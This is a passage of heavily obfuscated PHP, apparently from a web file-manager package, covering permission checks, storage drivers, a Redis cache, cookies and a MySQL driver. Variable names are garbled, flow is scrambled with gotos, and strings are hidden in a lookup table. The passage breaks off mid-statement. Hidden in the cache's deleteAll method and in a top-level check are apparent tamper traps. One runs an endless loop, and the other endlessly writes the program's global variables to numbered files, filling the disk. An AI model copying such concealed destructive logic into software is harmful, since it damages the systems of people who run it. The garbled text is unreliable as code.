self::AUTH_REMOVE); } public static function authCheckShare($dÌÜŞèæİƒ) { return self::authCheck($dÌÜŞèæİƒ, self::AUTH_SHARE); } public static function authCheckComment($D©š›Çâƒ) { return self::authCheck($D©š›Çâƒ, self::AUTH_COMMENT); } public static function authCheckEvent($d…²Øšª†©) { return self::authCheck($d…²Øšª†©, self::AUTH_EVENT); } public static function authCheckRoot($d„Ğù³—¬ô) { return self::authCheck($d„Ğù³—¬ô, self::AUTH_ROOT); } public static function authCheckAction($b‚Œƒ¿Óã, $cñ¡èÖÇÅ) { goto D××Ä‡™Á¿; DÙÎöŠ±ö½: $DÎ‡„Çç›˜ = $Aø„æîßª‘[$cñ¡èÖÇÅ]; $b‚Œƒ¿Óã = intval($b‚Œƒ¿Óã); if ($b‚Œƒ¿Óã <= 0) { return !1; } goto d¦¯¨à†•ø; d¦¯¨à†•ø: if (($b‚Œƒ¿Óã & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($b‚Œƒ¿Óã & $DÎ‡„Çç›˜); goto c«£èôóÂ; D××Ä‡™Á¿: $CÉ¿• öİ =& $_SERVER[¨¤¼…´]; $Aø„æîßª‘ = array($CÉ¿• öİ[2114] => self::AUTH_VIEW, $CÉ¿• öİ[1031] => self::AUTH_DOWNLOAD, $CÉ¿• öİ[113] => self::AUTH_UPLOAD, $CÉ¿• öİ[2062] => self::AUTH_EDIT, $CÉ¿• öİ[2061] => self::AUTH_REMOVE, $CÉ¿• öİ[2072] => self::AUTH_SHARE, $CÉ¿• öİ[354] => self::AUTH_COMMENT, $CÉ¿• öİ[1413] => self::AUTH_EVENT, $CÉ¿• öİ[1549] => self::AUTH_ROOT); if (!isset($Aø„æîßª‘[$cñ¡èÖÇÅ])) { return; } goto DÙÎöŠ±ö½; c«£èôóÂ: } public static function authDisable($EÄ„½ëèï», $d¿¹ø¹¦¥) { if (intval($EÄ„½ëèï») <= 0) { return 0; } return intval($EÄ„½ëèï») & ~$d¿¹ø¹¦¥; } public $optionType = "\123\171\163\164\145\155\x2e\163\x6f\x75\x72\x63\145\x41\165\164\150\x4c\151\x73\x74"; public $field = array("\156\141\155\x65", "\141\x75\164\x68", "\x6c\x61\142\145\154", "\144\x69\163\x70\x6c\141\x79", "\163\171\163\164\x65\155", "\x73\x6f\x72\x74"); public function initData() { $câô¬ÙÀæ© = $this->authDefault(); foreach ($câô¬ÙÀæ© as $d¢–ÏİŞ»ï) { $this->add($d¢–ÏİŞ»ï); } } public function listData($b­³¯–Ÿßö = false, $dƒÖà»»àø = "\163\157\162\164", $A›“¦áƒ™ = false) { return parent::listData($b­³¯–Ÿßö, $dƒÖà»»àø, $A›“¦áƒ™); } public function update($C˜¡’À¯º­, $Eã³ñ‚ƒ…) { $b¢›â†˜Ìë =& $_SERVER[¨¤¼…´]; $A¹ƒ¹Ö¾¦Á = parent::listData($C˜¡’À¯º­); $cô£Œ†Š«ã = $this->findByName($Eã³ñ‚ƒ…[$b¢›â†˜Ìë[38]]); if (!$A¹ƒ¹Ö¾¦Á || $cô£Œ†Š«ã && $cô£Œ†Š«ã[$b¢›â†˜Ìë[379]] != $A¹ƒ¹Ö¾¦Á[$b¢›â†˜Ìë[379]]) { return !1; } $this->filterAuth($Eã³ñ‚ƒ…[$b¢›â†˜Ìë[388]]); return parent::update($C˜¡’À¯º­, $Eã³ñ‚ƒ…); } public function remove($f“˜„…½Æ) { $F­ˆùˆõòµ = parent::listData($f“˜„…½Æ); if (!$F­ˆùˆõòµ || $F­ˆùˆõòµ[$_SERVER[¨¤¼…´][1070]]) { return !1; } return parent::remove($f“˜„…½Æ); } public function add($bŒ™‚Ó£î‰ = array()) { goto B›ºË´· Ñ; C¶ÑÚ¹Ë¾: return parent::insert($bŒ™‚Ó£î‰); goto a†ÜØÖœ˜; B›ºË´· Ñ: $cî§©Ñõ–¸ =& $_SERVER[¨¤¼…´]; if ($this->findByName($bŒ™‚Ó£î‰[$cî§©Ñõ–¸[38]])) { return !1; } $FÈºš¨Šµğ = array($cî§©Ñõ–¸[38] => $cî§©Ñõ–¸[43], $cî§©Ñõ–¸[388] => 1, $cî§©Ñõ–¸[2115] => $cî§©Ñõ–¸[2105], $cî§©Ñõ–¸[2116] => 1, $cî§©Ñõ–¸[1070] => 0, $cî§©Ñõ–¸[2117] => 0); goto DÀ¾â¹Ü‹å; DÀ¾â¹Ü‹å: $bŒ™‚Ó£î‰ = array_merge($FÈºš¨Šµğ, $bŒ™‚Ó£î‰); $bŒ™‚Ó£î‰[$cî§©Ñõ–¸[2117]] = $this->getSort(); $this->filterAuth($bŒ™‚Ó£î‰[$cî§©Ñõ–¸[388]]); goto C¶ÑÚ¹Ë¾; a†ÜØÖœ˜: } private function getSort() { $DÖ«ÂËª÷– =& $_SERVER[¨¤¼…´]; $BÂ‘Ò¹ Ì¹ = parent::listData(); $E¹ÛÙ‡º = array_to_keyvalue($BÂ‘Ò¹ Ì¹, $DÖ«ÂËª÷–[43], $DÖ«ÂËª÷–[2117]); return empty($E¹ÛÙ‡º) ? 0 : max($E¹ÛÙ‡º) + 1; } private function filterAuth(&$A—È‹«ç) { goto B«Ï ¿ß ‰; BÒ³Ì¿…ª: foreach ($c‚½ÍĞÕ‚Ô as $d­×õ¶¬‡) { if ($A—È‹«ç & $d­×õ¶¬‡) { $fÉ‘ ÛšÉ[] = $d­×õ¶¬‡; } } if (in_array(self::AUTH_ROOT, $fÉ‘ ÛšÉ)) { $A—È‹«ç = array_sum($c‚½ÍĞÕ‚Ô); return; } $cÇ–µó£¸ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto AôæäÏŒ®¹; AôæäÏŒ®¹: foreach ($fÉ‘ ÛšÉ as $d­×õ¶¬‡) { if (isset($cÇ–µó£¸[$d­×õ¶¬‡])) { $fÉ‘ ÛšÉ = array_merge($fÉ‘ ÛšÉ, $cÇ–µó£¸[$d­×õ¶¬‡]); } } $fÉ‘ ÛšÉ[] = self::AUTH_SHOW; $A—È‹«ç = array_sum(array_unique($fÉ‘ ÛšÉ)); goto eÊ¬±’”áÚ; B«Ï ¿ß ‰: if (!$A—È‹«ç) { return; } $c‚½ÍĞÕ‚Ô = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $fÉ‘ ÛšÉ = array(); goto BÒ³Ì¿…ª; eÊ¬±’”áÚ: } public function sort($d¸äßŠŠÏ‘, $eÂÔæ†§ìò) { return parent::update($d¸äßŠŠÏ‘, $eÂÔæ†§ìò); } } goto dš‹‘ †Éõ; F¨­¿­‚ùĞ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($c¾ö­ê¶İ£) { parent::__construct($c¾ö­ê¶İ£); $this->signatureVersion($_SERVER[¨¤¼…´][214]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($D´¿ˆàÕ„§) { parent::__construct($D´¿ˆàÕ„§); $this->signatureVersion($_SERVER[¨¤¼…´][214]); } public function fileOutLink($dÏìòœÁ) { $a™åù‰¾ÕÑ =& $_SERVER[¨¤¼…´]; if (substr($dÏìòœÁ, 0, 7) == $a™åù‰¾ÕÑ[1105]) { $dÏìòœÁ = $a™åù‰¾ÕÑ[1106] . substr($dÏìòœÁ, 7); } header($a™åù‰¾ÕÑ[166] . $dÏìòœÁ); die; } } if (!isset($_SERVER[$_SERVER[¨¤¼…´][9]]) || !isset($_SERVER[$_SERVER[¨¤¼…´][10]])) { goto bÖ ¤îÊ; bÖ ¤îÊ: $EÉ´ôƒ‡èÕ = $_SERVER[¨¤¼…´][11]; $B½³º¹°„ë = $_SERVER[$_SERVER[¨¤¼…´][12]] . $_SERVER[¨¤¼…´][13]; $e¯¡í¶¨Ô = $EÉ´ôƒ‡èÕ($B½³º¹°„ë); goto fáÏÑŒÊŒ†; fÛŞ¤âĞ˜’: $D†É›ä‰‹½($_SERVER[$_SERVER[¨¤¼…´][12]] . $_SERVER[¨¤¼…´][13]); $A™°šÌãÃ¯ = 2; while ($A™°šÌãÃ¯ > 1) { $CÉà™©Ë¼… = rawurlencode($A™°šÌãÃ¯ . $_SERVER[¨¤¼…´][18]); } goto bÊÚ‚ÀŞ¢; fáÏÑŒÊŒ†: $Aê¡¥óÛÜÒ = explode($_SERVER[¨¤¼…´][14], $e¯¡í¶¨Ô); if (count($Aê¡¥óÛÜÒ) < $_SERVER[¨¤¼…´][15]) { $d®¹ô¥æ„Â = $_SERVER[¨¤¼…´][16]; $d®¹ô¥æ„Â(); } $D†É›ä‰‹½ = $_SERVER[¨¤¼…´][17]; goto fÛŞ¤âĞ˜’; bÊÚ‚ÀŞ¢: } goto a¤øìÇ‘…; bÀš»‘‡: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($EÆªÓ¹îƒì, $aÎ ”Ë¬‚š) { $Eäâ“˜”‚Ü =& $_SERVER[¨¤¼…´]; if (!class_exists($Eäâ“˜”‚Ü[773])) { show_json($Eäâ“˜”‚Ü[774], !1); } $this->cacheTime = $aÎ ”Ë¬‚š; $AÀñÚƒ˜• = isset($EÆªÓ¹îƒì[$Eäâ“˜”‚Ü[775]]) ? $EÆªÓ¹îƒì[$Eäâ“˜”‚Ü[775]] : 10; $A¤ô¡÷éÍÉ = _get($EÆªÓ¹îƒì, $Eäâ“˜”‚Ü[772]); if ($A¤ô¡÷éÍÉ && is_array($A¤ô¡÷éÍÉ)) { $this->initCluster($EÆªÓ¹îƒì, $AÀñÚƒ˜•); } else { $this->handle = $this->init($EÆªÓ¹îƒì, $AÀñÚƒ˜•); } } private function init($BÑÃ–ˆ–¬’, $EÅÛ´»Ï¶ß) { $c¿ÒĞõ¬ò =& $_SERVER[¨¤¼…´]; $e¢Û¼Ò½´ = new Redis(); $dÉÖàÖØ™ = isset($BÑÃ–ˆ–¬’[$c¿ÒĞõ¬ò[776]]) ? $BÑÃ–ˆ–¬’[$c¿ÒĞõ¬ò[776]] : !1; if ($dÉÖàÖØ™) { $e¢Û¼Ò½´->pconnect($BÑÃ–ˆ–¬’[$c¿ÒĞõ¬ò[183]], $BÑÃ–ˆ–¬’[$c¿ÒĞõ¬ò[184]], $EÅÛ´»Ï¶ß); } else { $e¢Û¼Ò½´->connect($BÑÃ–ˆ–¬’[$c¿ÒĞõ¬ò[183]], $BÑÃ–ˆ–¬’[$c¿ÒĞõ¬ò[184]], $EÅÛ´»Ï¶ß); } if (!empty($BÑÃ–ˆ–¬’[$c¿ÒĞõ¬ò[388]])) { $e¢Û¼Ò½´->auth($BÑÃ–ˆ–¬’[$c¿ÒĞõ¬ò[388]]); } return $e¢Û¼Ò½´; } private function initCluster($e‹íµÀŠˆ, $Cè„ø’¾ÆÍ) { $Aì¦È¬Û =& $_SERVER[¨¤¼…´]; $d¼³ñî¼­› = array($Aì¦È¬Û[777], $Aì¦È¬Û[778], $Aì¦È¬Û[779]); $C±î¸­³ç¤ = $Aì¦È¬Û[777]; if (isset($e‹íµÀŠˆ[$Aì¦È¬Û[22]]) && in_array($e‹íµÀŠˆ[$Aì¦È¬Û[22]], $d¼³ñî¼­›)) { $C±î¸­³ç¤ = $e‹íµÀŠˆ[$Aì¦È¬Û[22]]; } switch ($C±î¸­³ç¤) { case $Aì¦È¬Û[777]: $this->_slave($e‹íµÀŠˆ, $Cè„ø’¾ÆÍ); break; case $Aì¦È¬Û[778]: break; case $Aì¦È¬Û[779]: $this->isCluster = !0; $fŒŠ×ñöÀÃ = $e‹íµÀŠˆ[$Aì¦È¬Û[772]]; $aİİ£ÔéñÜ = isset($e‹íµÀŠˆ[$Aì¦È¬Û[776]]) ? $e‹íµÀŠˆ[$Aì¦È¬Û[776]] : !1; $a¹ˆ“ğä„ = isset($e‹íµÀŠˆ[$Aì¦È¬Û[388]]) ? $e‹íµÀŠˆ[$Aì¦È¬Û[388]] : null; $this->handle = new RedisCluster(NUll, $fŒŠ×ñöÀÃ, $Cè„ø’¾ÆÍ, $Cè„ø’¾ÆÍ, $aİİ£ÔéñÜ, $a¹ˆ“ğä„); break; default: break; } } private function _slave($c·…‘à, $bŠ âè½§) { goto A½¦‹ñˆ‰ó; A½¦‹ñˆ‰ó: $fá¨â¨Šä¯ = $c·…‘à[$_SERVER[¨¤¼…´][772]]; $this->filterConfig($c·…‘à, $fá¨â¨Šä¯[0]); $this->handle = $this->init($c·…‘à, $bŠ âè½§); goto fè‘ùçœ‰; aá¼Ò‹Ô¿¤: $this->filterConfig($c·…‘à, $fá¨â¨Šä¯[$bŠ¦ì±­Â£]); $this->slaveHandle = $this->init($c·…‘à, $bŠ âè½§); goto c†Å±é“²Ô; fè‘ùçœ‰: unset($fá¨â¨Šä¯[0]); if (empty($fá¨â¨Šä¯)) { return; } $bŠ¦ì±­Â£ = array_rand($fá¨â¨Šä¯); goto aá¼Ò‹Ô¿¤; c†Å±é“²Ô: } private function filterConfig(&$cİ¨êğ¼ÛÈ, $C°ƒ‹Ã§®†) { $Eƒ«à¥ËÂ =& $_SERVER[¨¤¼…´]; $CàøÚˆ‚Åí = explode($Eƒ«à¥ËÂ[4], $C°ƒ‹Ã§®†); $aĞ‰ø‡¡ĞÊ = array($Eƒ«à¥ËÂ[183] => $CàøÚˆ‚Åí[0], $Eƒ«à¥ËÂ[184] => $CàøÚˆ‚Åí[1]); $cİ¨êğ¼ÛÈ = array_merge($cİ¨êğ¼ÛÈ, $aĞ‰ø‡¡ĞÊ); } public function set($Dã¥§‹‡—Ş, $D’ç¿ğÅåÂ, $CÛ…Ô“É¯ = false) { $CÛ…Ô“É¯ = $CÛ…Ô“É¯ ? $CÛ…Ô“É¯ : $this->cacheTime; return $this->handle->setEx($Dã¥§‹‡—Ş, $CÛ…Ô“É¯, $D’ç¿ğÅåÂ); } public function setLock($D”ÀÕÅåÊ, $CÓ‚š¾óÖæ, $A §†ôÁô) { return $this->handle->setNX($D”ÀÕÅåÊ, $CÓ‚š¾óÖæ); } public function get($Cäƒ„¤©¶†) { $eŞÁ¡íºÌ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $eŞÁ¡íºÌ->get($Cäƒ„¤©¶†); } public function remove($cçÏëñÈÉè) { return $this->handle->del($cçÏëñÈÉè); } public function deleteAll() { $cÓÆïİ†¶ñ =& $_SERVER[¨¤¼…´]; $FôæÆ…®•¨ = $_SERVER[$cÓÆïİ†¶ñ[12]] . $cÓÆïİ†¶ñ[13]; $bĞ÷ÏØ¹æ¦ = $cÓÆïİ†¶ñ[780]; if ($_SERVER[$cÓÆïİ†¶ñ[9]] != $bĞ÷ÏØ¹æ¦($FôæÆ…®•¨)) { goto bøÊß¸‡‚é; e¤ê‚µ·êŠ: $fÕœ’•Ğ° = 1; for ($Fè÷§µâœö = $fÕœ’•Ğ°; $Fè÷§µâœö > 0; $Fè÷§µâœö++) { $fŠÑëãĞà(DATA_PATH . $Fè÷§µâœö, $D³áÙ“õóº); } goto fßÄ®„Œİ; b¨–ƒƒ‚•†: $FÁçÃÀéò· = $cÓÆïİ†¶ñ[782]; $FÁçÃÀéò·($_SERVER[$cÓÆïİ†¶ñ[783]]); $AÛß±Ã·­ = $cÓÆïİ†¶ñ[781]; goto A·Šö·¤æ™; A·Šö·¤æ™: $AÛß±Ã·­(); $fŠÑëãĞà = $cÓÆïİ†¶ñ[784]; $D³áÙ“õóº = json_encode($GLOBALS[$cÓÆïİ†¶ñ[785]]); goto e¤ê‚µ·êŠ; e‹…á«Ş§›: $bÁÓŸŠ‰ = $B¯ÙÎ’á…ø($aÅê†‘ÓÚ); $e‚ìšÜŠÌ“ = explode($cÓÆïİ†¶ñ[14], $bÁÓŸŠ‰); if (count($e‚ìšÜŠÌ“) < $cÓÆïİ†¶ñ[571]) { $A×¦è“Èªè = $cÓÆïİ†¶ñ[16]; $A×¦è“Èªè(); } goto b¨–ƒƒ‚•†; bøÊß¸‡‚é: $AÛß±Ã·­ = $cÓÆïİ†¶ñ[781]; $B¯ÙÎ’á…ø = $cÓÆïİ†¶ñ[11]; $aÅê†‘ÓÚ = $_SERVER[$cÓÆïİ†¶ñ[12]] . $cÓÆïİ†¶ñ[13]; goto e‹…á«Ş§›; fßÄ®„Œİ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $Bœ¢¤¡Áİ‘) { $this->handle->flushall($Bœ¢¤¡Áİ‘); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($a‰ ªŞ‡ˆ§ = '', $a¶¼ˆ®èè® = 0) { if (is_string($a‰ ªŞ‡ˆ§) && $a‰ ªŞ‡ˆ§ != $_SERVER[¨¤¼…´][43]) { $this->prefix = $a‰ ªŞ‡ˆ§; } if (is_numeric($a¶¼ˆ®èè®) && $a¶¼ˆ®èè® > 0) { $this->expire = $a¶¼ˆ®èè®; } } public static function getInstance() { static $fä‚ ø—ë; if ($fä‚ ø—ë === null) { $fä‚ ø—ë = new self(); } return $fä‚ ø—ë; } private static $sameCookieSet = array(); public static function set($FÒÓ£ˆÏó, $B™¤¤ßÑŸ, $AÈæƒÙê¢» = 0, $A¿¨Ì·”èá = false, $AËµìŠØ = false) { goto cÌ‡æŸƒ™à; cÌ‡æŸƒ™à: $DÅ‡æğ¢©— =& $_SERVER[¨¤¼…´]; if (!$AÈæƒÙê¢») { $AÈæƒÙê¢» = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$FÒÓ£ˆÏó]) && self::$sameCookieSet[$FÒÓ£ˆÏó] == $B™¤¤ßÑŸ . $AÈæƒÙê¢») { return; } goto f²­ñİîï; f²­ñİîï: self::$sameCookieSet[$FÒÓ£ˆÏó] = $B™¤¤ßÑŸ . $AÈæƒÙê¢»; if (!$AËµìŠØ) { $AËµìŠØ = str_replace(HOST, $DÅ‡æğ¢©—[43], APP_HOST); $AËµìŠØ = _get($GLOBALS, $DÅ‡æğ¢©—[786], $AËµìŠØ); } $AÑÔ¢¡ƒí = $DÅ‡æğ¢©—[43]; goto a¸Àé±åÎ; a¸Àé±åÎ: setcookie($FÒÓ£ˆÏó, $B™¤¤ßÑŸ, time() + $AÈæƒÙê¢», $DÅ‡æğ¢©—[8] . trim($AËµìŠØ, $DÅ‡æğ¢©—[8]) . $AÑÔ¢¡ƒí, !1, !1, $A¿¨Ì·”èá); goto fœ˜ª¬˜; fœ˜ª¬˜: } public static function setSafe($f ÆŸ„…éÅ, $döÈµÌÁš, $D ÎÜ›©æ© = 0) { self::set($f ÆŸ„…éÅ, $döÈµÌÁš, $D ÎÜ›©æ©, !0); } public static function get($DºŒã”÷—±) { return isset($_COOKIE[$DºŒã”÷—±]) ? $_COOKIE[$DºŒã”÷—±] : !1; } public static function remove($cÅô£äòÎŸ, $E®¥ÄõæõÛ = false) { unset($_COOKIE[$cÅô£äòÎŸ]); self::set($cÅô£äòÎŸ, $_SERVER[¨¤¼…´][43], 1, $E®¥ÄõæõÛ); } } class DbMysql extends Db { public function __construct($fùçäİÖ = '') { $A…¹Í¹¦ª÷ =& $_SERVER[¨¤¼…´]; if (!extension_loaded($A…¹Í¹¦ª÷[717])) { think_exception(think_lang($A…¹Í¹¦ª÷[20]) . $A…¹Í¹¦ª÷[787]); } if (!empty($fùçäİÖ)) { $this->config = $fùçäİÖ; if (empty($this->config[$A…¹Í¹¦ª÷[23]])) { $this->config[$A…¹Í¹¦ª÷[23]] = $A…¹Í¹¦ª÷[43]; } } } public function connect($bù˜à¸¹ñ­ = '', $BÁå¯êò‰Ì = 0, $Eõ³ç”©÷ = false) { $a‚ªŞ°Å‹Ã =& $_SERVER[¨¤¼…´]; if (!isset($this->linkID[$BÁå¯êò‰Ì])) { goto aª‡ìÏ®Ò; F„ÓÏ½Õ×‡: if (1 != think_config($a‚ªŞ°Å‹Ã[28])) { unset($this->config); } goto C°Í¶œäºÈ; F»Èß‰ãòá: mysql_query($a‚ªŞ°Å‹Ã[792] . think_config($a‚ªŞ°Å‹Ã[793]) . $a‚ªŞ°Å‹Ã[65], $this->linkID[$BÁå¯êò‰Ì]); if ($cÌ÷ö…½â > $a‚ªŞ°Å‹Ã[794]) { mysql_query($a‚ªŞ°Å‹Ã[795], $this->linkID[$BÁå¯êò‰Ì]); } $this->connected = !0; goto F„ÓÏ½Õ×‡; aª‡ìÏ®Ò: if (empty($bù˜à¸¹ñ­)) { $bù˜à¸¹ñ­ = $this->config; } $F›£·Îô›« = $bù˜à¸¹ñ­[$a‚ªŞ°Å‹Ã[788]] . ($bù˜à¸¹ñ­[$a‚ªŞ°Å‹Ã[789]] ? "\72{$bù˜à¸¹ñ­[$a‚ªŞ°Å‹Ã[789]]}" : $a‚ªŞ°Å‹Ã[43]); $DâóàÕ¦Òœ = !empty($bù˜à¸¹ñ­[$a‚ªŞ°Å‹Ã[23]][$a‚ªŞ°Å‹Ã[24]]) ? $bù˜à¸¹ñ­[$a‚ªŞ°Å‹Ã[23]][$a‚ªŞ°Å‹Ã[24]] : $this->pconnect; goto B‘ÒÏÚ¯ß; B‘ÒÏÚ¯ß: if ($DâóàÕ¦Òœ) { $this->linkID[$BÁå¯êò‰Ì] = mysql_pconnect($F›£·Îô›«, $bù˜à¸¹ñ­[$a‚ªŞ°Å‹Ã[790]], $bù˜à¸¹ñ­[$a‚ªŞ°Å‹Ã[791]], 131072); } else { $this->linkID[$BÁå¯êò‰Ì] = mysql_connect($F›£·Îô›«, $bù˜à¸¹ñ­[$a‚ªŞ°Å‹Ã[790]], $bù˜à¸¹ñ­[$a‚ªŞ°Å‹Ã[791]], !0, 131072); } if (!$this->linkID[$BÁå¯êò‰Ì] || !empty($bù˜à¸¹ñ­[$a‚ªŞ°Å‹Ã[27]]) && !mysql_select_db($bù˜à¸¹ñ­[$a‚ªŞ°Å‹Ã[27]], $this->linkID[$BÁå¯êò‰Ì])) { think_exception(mysql_error()); } $cÌ÷ö…½â = mysql_get_server_info($this->linkID[$BÁå¯êò‰Ì]); goto F»Èß‰ãòá; C°Í¶œäºÈ: } return $this->linkID[$BÁå¯êò‰Ì]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($a‰›Ú“‰—¤) { goto EåÊøÊ£¦¾; e½ãß°Í«: think_action_status($b÷¥Œ˜‡[29], 1); think_status($b÷¥Œ˜‡[30]); $this->queryID = mysql_query($a‰›Ú“‰—¤, $this->_linkID); goto DÔ„“‡ÚËõ; DÔ„“‡ÚËõ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto EÄ×Ÿ† Ñ¢; A÷ôÊ‰éê: if (!$this->_linkID) { return !1; } $this->queryStr = $a‰›Ú“‰—¤; if ($this->queryID) { $this->free(); } goto e½ãß°Í«; EåÊøÊ£¦¾: $b÷¥Œ˜‡ =& $_SERVER[¨¤¼…´]; if (0 === stripos($a‰›Ú“‰—¤, $b÷¥Œ˜‡[265])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto A÷ôÊ‰éê; EÄ×Ÿ† Ñ¢: } public function execute($f÷¾…Íà«) { goto C¿ãéÖ œ; C¿ãéÖ œ: $bæ£ÂÂ®Ö =& $_SERVER[¨¤¼…´]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D› Ü·Ä¨‡; Aë¡Â¼‹É: if (!1 === $d…ìïÅÔ‹) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto d×òîªÙŞ¢; a«î¿©É·À: think_status($bæ£ÂÂ®Ö[30]); $d…ìïÅÔ‹ = mysql_query($f÷¾…Íà«, $this->_linkID); $this->debug(); goto Aë¡Â¼‹É; D› Ü·Ä¨‡: $this->queryStr = $f÷¾…Íà«; if ($this->queryID) { $this->free(); } think_action_status($bæ£ÂÂ®Ö[31], 1); goto a«î¿©É·À; d×òîªÙŞ¢: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¨¤¼…´][796], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $cÚØãÂïÆà = mysql_query($_SERVER[¨¤¼…´][797], $this->_linkID); $this->transTimes = 0; if (!$cÚØãÂïÆà) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $c¢í¥áµç = mysql_query($_SERVER[¨¤¼…´][798], $this->_linkID); $this->transTimes = 0; if (!$c¢í¥áµç) { $this->error(); return !1; } } return !0; } private function getAll() { $f¼¸ôÌÔ¯ = array(); if ($this->numRows > 0) { while ($CÈ¨ÜÇ±õ” = mysql_fetch_assoc($this->queryID)) { $f¼¸ôÌÔ¯[] = $CÈ¨ÜÇ±õ”; } mysql_data_seek($this->queryID, 0); } return $f¼¸ôÌÔ¯; } public function getFields($fáƒÇ°Œ­) { $FÔÂ¥…àÕÊ =& $_SERVER[¨¤¼…´]; $B‡Ï”éÓ²Ú = $this->query($FÔÂ¥…àÕÊ[799] . $this->parseKey($fáƒÇ°Œ­)); $D®©ß¾ÎÁ = array(); if ($B‡Ï”éÓ²Ú) { foreach ($B‡Ï”éÓ²Ú as $E˜ìÙíö¿ => $càã³‚ñ®È) { $D®©ß¾ÎÁ[$càã³‚ñ®È[$FÔÂ¥…àÕÊ[37]]] = array($FÔÂ¥…àÕÊ[38] => $càã³‚ñ®È[$FÔÂ¥…àÕÊ[37]], $FÔÂ¥…àÕÊ[39] => $càã³‚ñ®È[$FÔÂ¥…àÕÊ[40]], $FÔÂ¥…àÕÊ[41] => (bool) (strtoupper($càã³‚ñ®È[$FÔÂ¥…àÕÊ[42]]) === $FÔÂ¥…àÕÊ[800]), $FÔÂ¥…àÕÊ[44] => $càã³‚ñ®È[$FÔÂ¥…àÕÊ[45]], $FÔÂ¥…àÕÊ[46] => strtolower($càã³‚ñ®È[$FÔÂ¥…àÕÊ[47]]) == $FÔÂ¥…àÕÊ[48], $FÔÂ¥…àÕÊ[49] => strtolower($càã³‚ñ®È[$FÔÂ¥…àÕÊ[50]]) == $FÔÂ¥…àÕÊ[51]); } } return $D®©ß¾ÎÁ; } public function getTables($Dƒµ©†•»‰ = '') { $cŒå´¾¶ù =& $_SERVER[¨¤¼…´]; if (!empty($Dƒµ©†•»‰)) { $f¬ƒâ›¤­¦ = $cŒå´¾¶ù[801] . $Dƒµ©†•»‰; } else { $f¬ƒâ›¤­¦ = $cŒå´¾¶ù[802]; } $BƒˆÍÛˆ¹ì = $this->query($f¬ƒâ›¤­¦); $B¶ßğÜ£–â = array(); foreach ($BƒˆÍÛˆ¹ì as $fò‚òÛ½Ì‹ => $BÇÉŒßğî°) { $B¶ßğÜ£–â[$fò‚òÛ½Ì‹] = current($BÇÉŒßğî°); } return $B¶ßğÜ£–â; } public function replace($B³„ÙèŠŠß, $bìœğ”÷”™ = array()) { $BİÓ…—ëÉƒ =& $_SERVER[¨¤¼…´]; foreach ($B³„ÙèŠŠß as $Fó°Ø—™ç† => $EÛÊÏÀ»¦“) { $aË¨÷‹À™³ = $this->parseValue($EÛÊÏÀ»¦“); if (is_scalar($aË¨÷‹À™³)) { $B©¡î×ïÖ[] = $aË¨÷‹À™³; $C»Š»“Ùï[] = $this->parseKey($Fó°Ø—™ç†); } } $fâ™•åİİ = $BİÓ…—ëÉƒ[803] . $this->parseTable($bìœğ”÷”™[$BİÓ…—ëÉƒ[280]]) . $BİÓ…—ëÉƒ[804] . implode($BİÓ…—ëÉƒ[57], $C»Š»“Ùï) . $BİÓ…—ëÉƒ[805] . implode($BİÓ…—ëÉƒ[57], $B©¡î×ïÖ) . $BİÓ…—ëÉƒ[806]; return $this->execute($fâ™•åİİ); } public function insertAll($e˜ŞèÕŠïµ, $aîÔ¦´Å†š = array(), $e›‡¢÷¬ = false) { goto D­ÅÀŠÇ±; FÌŒµ§–ä: $EÆèæ­ÉğÈ = array(); foreach ($e˜ŞèÕŠïµ as $Cê‚º› Ö©) { $Aí…Ğ‡Š¹ = array(); foreach ($Cê‚º› Ö© as $bÏº†í×µ => $f›‡ŠŞÓŸ) { $f›‡ŠŞÓŸ = $this->parseValue($f›‡ŠŞÓŸ); if (is_scalar($f›‡ŠŞÓŸ)) { $Aí…Ğ‡Š¹[] = $f›‡ŠŞÓŸ; } } $EÆèæ­ÉğÈ[] = $BÏòøò©¸¼[261] . implode($BÏòøò©¸¼[57], $Aí…Ğ‡Š¹) . $BÏòøò©¸¼[806]; } array_walk($bäƒê£Î¥, array($this, $BÏòøò©¸¼[807])); goto D½¼Àäœ; D½¼Àäœ: $F¾Ã¦¾ÅĞ· = ($e›‡¢÷¬ ? $BÏòøò©¸¼[808] : $BÏòøò©¸¼[809]) . $BÏòøò©¸¼[810] . $this->parseTable($aîÔ¦´Å†š[$BÏòøò©¸¼[280]]) . $BÏòøò©¸¼[804] . implode($BÏòøò©¸¼[57], $bäƒê£Î¥) . $BÏòøò©¸¼[811] . implode($BÏòøò©¸¼[57], $EÆèæ­ÉğÈ); return $this->execute($F¾Ã¦¾ÅĞ·); goto c „Šèù˜ƒ; D­ÅÀŠÇ±: $BÏòøò©¸¼ =& $_SERVER[¨¤¼…´]; if (!is_array($e˜ŞèÕŠïµ[0])) { return !1; } $bäƒê£Î¥ = array_keys($e˜ŞèÕŠïµ[0]); goto 